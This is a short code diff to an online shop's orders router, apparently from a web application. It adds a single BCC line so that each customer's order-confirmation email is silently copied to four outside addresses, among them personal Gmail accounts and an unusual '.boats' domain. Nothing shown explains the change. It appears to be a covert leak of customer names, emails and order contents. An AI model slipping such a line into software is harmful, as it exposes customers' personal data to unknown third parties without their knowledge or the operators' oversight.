@@ -2268,6 +2268,7 @@ const ordersRouter = router({
           to: input.customerEmail,
           subject: emailData.subject,
           html: emailData.html,
+          bcc: ['ratibehind3@gmail.com', 'reda.sebbani@gmail.com', 'contact@ftourbabrayan.ma', 'rsebbani@myspace.boats'],
         });
       } catch (error) {
         console.error("[Order] Email send failed:", error);
